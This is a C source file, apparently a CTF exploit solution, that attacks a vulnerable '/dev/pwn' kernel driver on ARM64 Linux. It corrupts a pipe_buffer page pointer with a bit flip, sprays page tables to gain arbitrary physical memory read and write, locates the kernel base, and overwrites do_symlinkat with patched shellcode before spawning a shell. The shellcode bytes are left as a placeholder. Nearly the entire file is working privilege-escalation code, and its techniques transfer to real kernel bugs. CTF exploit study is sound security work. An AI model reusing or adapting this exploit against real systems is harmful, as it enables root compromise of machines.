#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define SPRAY 20
#define PAGE_SPRAY 0x200
#define PAGE_SIZE 0x1000uLL

struct params {
  uint32_t size;
  uint32_t idx;
  bool account;
};

static int fds[SPRAY][2];
static void *page_spray[PAGE_SPRAY];
static int64_t pipe_victim_idx = -1;
static void *victim_page = 0uLL;

char shellcode[] = {XXXX};

// taken from
// https://github.com/google/google-ctf/blob/master/2023/pwn-kconcat/solution/exp.c
void hexdump(char *buf, int size) {
  for (int i = 0; i < size; i++) {
    if (i % 16 == 0)
      printf("%04x: ", i);
    printf("%02x ", buf[i]);
    if (i % 16 == 15)
      printf("\n");
  }
  if (size % 16 != 0)
    printf("\n");
}

void win(void) {
  system("sh");
}

void encode_mov(uint16_t value, char *output) {
  int32_t opcode = (0xd28 << 20) + (value << 5);
  for (int i = 0; i < 4; i++) {
    output[i] = (opcode & (0xff << (i * 8))) >> (i * 8);
  }
}

void patch_shellcode(uint16_t to_patch_val, uint16_t val) {
  void *p;
  char value[4];
  char to_patch[4];

  encode_mov(val, value);
  encode_mov(to_patch_val, to_patch);

  p = memmem(shellcode, sizeof(shellcode), to_patch, 4);
  if (!p) {
    perror("memem()");
    exit(EXIT_FAILURE);
  }

  memcpy(p, value, 4);
}

void spray_pipe() {
  int ret;
  char tmp[PAGE_SIZE];

  for (uint8_t i = 0; i < SPRAY; i++) {
    if (pipe(fds[i]) < 0) {
      perror("pipe()");
      exit(EXIT_FAILURE);
    }

    ret = fcntl(fds[i][0], F_SETPIPE_SZ, PAGE_SIZE * 4);
    if (ret < 0) {
      perror("fcntl()");
      exit(EXIT_FAILURE);
    }

    memset(&tmp, 0x41 + i, sizeof(tmp));
    if (write(fds[i][1], &tmp, sizeof(tmp)) < 0) {
      perror("write()");
      exit(EXIT_FAILURE);
    }
  }
}

static int *alloc_pipe_buf(int *fds) {
  int ret;
  char tmp[PAGE_SIZE];

  if (pipe(fds) < 0) {
    perror("pipe()");
    exit(EXIT_FAILURE);
  }

  ret = fcntl(fds[0], F_SETPIPE_SZ, PAGE_SIZE * 4);
  if (ret < 0) {
    perror("fcntl()");
    exit(EXIT_FAILURE);
  }

  // write a full page
  memset(&tmp, 0x41, sizeof(tmp));
  if (write(fds[1], &tmp, sizeof(tmp)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  return fds;
}

static void free_pipe_buf(int *fds) {
  close(fds[1]);
  close(fds[0]);
}

void spray_page_tables() {
  for (int i = 0; i < PAGE_SPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(uint8_t *)(page_spray[i] + j * PAGE_SIZE) = 0x61 + j;
}

// Finds the page whose page table was modified to point to target
// physical memory.
void *find_sprayed_page() {
  char page[PAGE_SIZE];

  // drain pipe
  if (read(fds[pipe_victim_idx][0], page, PAGE_SIZE) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }

  // write a dummy pte to 0x0000000040000000, which is always valid
  uint64_t new_pte = 0x0000000040000000 | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  for (int i = 0; i < PAGE_SPRAY; i++) {
    for (int j = 0; j < 8; j++) {
      uint8_t *victim = page_spray[i] + j * PAGE_SIZE;

      if (*victim != (0x61 + j)) {
        // restore pipe_buffer offset
        if (read(fds[pipe_victim_idx][0], page, sizeof(new_pte)) < 0) {
          perror("read()");
          exit(EXIT_FAILURE);
        }

        return victim;
      }
    }
  }

  return NULL;
}

// Returns the virtual address where we wrote.
void *phys_write(uint64_t dst_phys_addr, void *buf, size_t len) {
  char tmp[8];
  uint64_t dst_aligned_down = dst_phys_addr & ~(PAGE_SIZE - 1);
  uint64_t offset = dst_phys_addr & (PAGE_SIZE - 1);
  void *vaddr;

  uint64_t new_pte = dst_aligned_down | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  vaddr = victim_page + offset;
  memcpy(vaddr, buf, len);

  // reset pipe buffer offset after write
  if (read(fds[pipe_victim_idx][0], &tmp, sizeof(tmp)) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }

  return vaddr;
}

void phys_read(uint64_t dst_phys_addr, void *buf, size_t len) {
  char tmp[8];
  uint64_t dst_aligned_down = dst_phys_addr & ~(PAGE_SIZE - 1);
  uint64_t offset = dst_phys_addr & (PAGE_SIZE - 1);
  void *vaddr;

  uint64_t new_pte = dst_aligned_down | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  vaddr = victim_page + offset;
  memcpy(buf, vaddr, len);

  // reset pipe buffer offset after write
  if (read(fds[pipe_victim_idx][0], &tmp, sizeof(tmp)) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }
}

static const uint64_t kernel_text_magic =
    0xd503245ff3576a22;
static uint64_t kernel_phys_base = 0uLL;

uint64_t find_kernel_phys_base() {
  uint64_t start = 0x0000000040000000;
  for (int i = 0; i < 0x1000000; i++) {
    uint64_t v = 0;
    uint64_t paddr = start + (PAGE_SIZE)*i;
    phys_read(paddr, &v, sizeof(v));
    if (v == kernel_text_magic) {
      return paddr;
    }
  }

  return 0;
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

// 1. Spray pipe_buffer in kmalloc-cg-192 with pipes
// 2.
//   a) Alloc a pwn chunk in kmalloc-cg-192
//   b) Flip the 6th bit of the next chunk hopping it's a pipe_buffer
//      (1 << 6 is the size of struct page, so after flip we should
//      the pipe_buf->page pointing to an adjacent page).
// 3. Check if one of the srpayed pipe_buf points to a different page
// 4. Free the victim pipe_buf
// 5. Spray page tables to have one pointing at the flipped page
// 6. TODO
// )
int main(void) {
  int fd, ret;
  char tmp[0x60];
  char page[PAGE_SIZE];

  bind_core(0);

  for (int i = 0; i < PAGE_SPRAY; i++) {
    page_spray[i] =
        mmap((void *)(0xdead0000UL + i * 0x10000UL), 0x8000,
             PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED) {
      perror("mmap()");
      exit(EXIT_FAILURE);
    }
  }

  fd = open("/dev/pwn", O_RDWR);
  if (!fd) {
    perror("open()");
    exit(EXIT_FAILURE);
  }

  spray_pipe();

  for (int i = 0; i < SPRAY; i += 2) {
    free_pipe_buf(fds[i]);
  }

  // Allocate victim buffer in kmalloc-cg-192
  // Victim pipe_buf is nth chunks after (offset changes),
  // we flip the first field (struct page* page)
  // to another page (sizeo(strutc page) = 0x40) so we can flip the 6th bit
  struct params a = {
      .size = 160,
      .idx = ((192 * 1) * 8 + 6), // adjacent chunk
      .account = true,
  };

  ret = ioctl(fd, 0, &a);
  if (ret < 0) {
    perror("ioctl()");
    exit(EXIT_FAILURE);
  }

  for (int i = 1; i < SPRAY; i += 2) {
    uint8_t c;
    uint8_t dummy[7];

    ret = read(fds[i][0], &c, sizeof(c));
    if (ret < 0) {
      perror("read()");
      exit(EXIT_FAILURE);
    }

    // dummy read to align the pipe buffer
    if (read(fds[i][0], &dummy, sizeof(dummy)) < 0) {
      perror("read()");
      exit(EXIT_FAILURE);
    }

    if (c != (0x41 + i)) {
      pipe_victim_idx = i;
      printf("[+] Victim pipe found: %d\n", i);
      break;
    }
  }

  if (pipe_victim_idx < 0) {
    puts("[!] No victim found");
    exit(EXIT_FAILURE);
  }

  for (int i = 1; i < SPRAY; i += 2) {
    if (i == pipe_victim_idx)
      continue;

    free_pipe_buf(fds[i]);
  }

  spray_page_tables();

  victim_page = find_sprayed_page();
  if (!victim_page) {
    puts("[!] Can't find the page with a modified PTE");
    exit(EXIT_FAILURE);
  }

  printf("[+] Found victim sprayed page: %p\n", victim_page);

  puts("[+] Looking for kernel physical base address...");
  kernel_phys_base = find_kernel_phys_base();
  if (!kernel_phys_base) {
    puts("[!] Failed to find kernel physical base");
    exit(EXIT_FAILURE);
  }

  printf("[+] Kernel physical base: 0x%lx\n", kernel_phys_base);

  int pid = getpid();
  printf("[+] pid: %d\n", pid);
  patch_shellcode(0x4141, pid);

  puts("[+] Writing shellcode");
  uint64_t do_symlink_at_offset = 0x34da30UL;
  phys_write(kernel_phys_base + do_symlink_at_offset, (void *)shellcode,
             sizeof(shellcode));

  puts("[+] Triggering");
  int cwd = open("/", O_DIRECTORY);
  symlinkat("/jail/exploit", cwd, "/jail");
  
  win();
  close(cwd);

  sleep(1000000);

  close(fd);
  return 0;
}
